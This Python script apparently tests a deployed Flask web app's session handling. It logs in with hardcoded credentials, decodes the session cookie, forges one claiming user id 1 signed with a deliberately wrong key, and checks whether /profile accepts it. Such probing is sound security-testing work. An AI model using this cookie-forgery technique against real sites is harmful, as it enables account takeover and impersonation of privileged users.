import requests, flask_unsign as fu, time, re

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        c = s.cookies.get('session')
        if c:
            return c
        time.sleep(30)
    return None

def get_profile(cookie, tries=8):
    for a in range(tries):
        try:
            r = requests.get(base + '/profile', headers={'Cookie': 'session=' + cookie},
                             timeout=40, allow_redirects=False)
        except Exception:
            time.sleep(15); continue
        if r.status_code in (429, 502, 503):
            time.sleep(20); continue
        who = re.search(r'<h2>(.*?)</h2>', r.text)
        return r.status_code, r.headers.get('Location', '')[:28], (who.group(1) if who else '')
    return 'TRANSIENT', '', ''

valid = login()
base_id = fu.decode(valid).get('_id')
forged = fu.sign({'_fresh': True, '_id': base_id, '_user_id': '1'}, 'DEFINITELY-WRONG-KEY')
print('FORGED wrongsig ->', get_profile(forged))
